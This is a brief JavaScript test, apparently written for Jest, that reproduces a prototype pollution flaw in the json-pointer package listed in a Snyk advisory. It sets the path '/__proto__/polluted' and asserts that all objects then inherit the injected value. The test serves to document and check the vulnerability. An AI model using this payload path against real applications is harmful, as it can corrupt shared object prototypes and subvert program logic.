//https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-596925
test("prototype pollution in json-pointer", () => {
  const pointer = require("json-pointer");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  pointer.set(obj, "/__proto__/polluted", "yes");
  expect({}.polluted).toBe("yes");
});
